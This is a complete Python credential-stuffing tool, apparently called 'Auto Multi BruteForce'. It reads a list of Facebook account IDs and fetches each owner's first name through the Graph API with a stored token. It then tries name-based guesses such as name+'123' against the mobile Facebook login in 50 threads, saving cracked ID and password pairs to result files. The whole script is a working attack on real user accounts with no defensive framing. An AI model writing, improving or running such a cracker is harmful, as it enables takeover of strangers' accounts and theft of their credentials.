import requests,os,sys,time,json
from multiprocessing.pool import  ThreadPool

class AutoB:
	def __init__(self):
		self.fnd=0
		self.cek=0
		self.hit=0
		self.tar=[]
		self.ken=open('toket/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.main()

	def nama(self,id):
		try:
			nem=requests.get(self.u.format(id+'/?access_token='+self.ken))
			js=json.loads(nem.text)
			if ' ' in js['first_name']:
				self.attk(id,js['first_name'].split(' ')[0])
			else:
				self.attk(id,js['first_name'])
		except: pass

	def attk(self,idd,name):
		try:
			lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
			for x in lid:
				data={'email':idd,'pass':x}
				re=requests.post('https://mbasic.facebook.com/login',data=data).text
				if 'save-device' in re or 'm_sess' in re:
					self.fnd+=1
					pen=open('result/found.txt','a')
					pen.write(f'{idd}|{x}\n')
					break
				elif 'checkpoint' in re:
					self.cek+=1
					pen=open('result/cek.txt','a')
					pen.write(f'{idd}|{x}\n')
					break
		except: pass
		self.hit+=1
		print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')

	def main(self):
		try:
			os.mkdir('result')
		except: pass
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;
	; Auto Multi BruteForce ;
	;    By: KANG-NEWBIE    ;
	;;;;;;;;;;;;;;;;;;;;;;;;;
	""")
		fil=input('[?] List Id Target: ')
		try:
			file=open(fil,'r').read().splitlines()
		except FileNotFoundError:
			exit('[!] File not found')
		tan=input('[?] Do you want enter extra password (y/n): ')
		if tan == 'y' or tan == 'Y':
			self.spas=input('[?] Extra password: ')
		else:
			self.spas=''
		print()
		for x in file:
			self.tar.append(x)
		p=ThreadPool(50)
		p.map(self.nama,self.tar)
		if self.fnd > 0 or self.cek > 0:
			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
		else: print("\n[ :( ] nothing found")
		if self.fnd > 0:
			print("found result saved: result/found.txt")
		if self.cek > 0:
			print("check result saved: result/cek.txt")
try:
	AutoB()
except Exception as FCK:
	print(f'Err: {FCK}')